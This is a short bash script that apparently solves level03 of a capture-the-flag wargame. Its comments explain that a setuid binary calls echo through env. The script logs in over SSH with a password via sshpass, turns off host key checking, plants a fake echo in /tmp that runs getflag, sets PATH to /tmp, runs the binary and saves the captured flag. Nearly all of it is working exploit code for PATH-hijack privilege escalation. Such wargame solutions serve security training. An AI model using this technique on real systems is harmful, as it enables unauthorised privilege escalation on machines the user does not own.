#!/usr/bin/env bash

# There is a file called level03 in the home directory of level03 which is an executable
# When ran "strings" you can see that it uses echo: /usr/bin/env echo Exploit me
# So we can create a script that will be ran instead of echo and add it to the PATH

SCRIPT="echo \"/bin/getflag\" > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;./level03"

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ] ; then
    flag=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level03@$1 -p $2 $SCRIPT | awk '{print $NF}')
    echo 'password:'
    echo $flag
    echo $flag > flag03.pwd
else
    echo "Usage: ./flag03.sh <ip address> <port> <password>"
fi
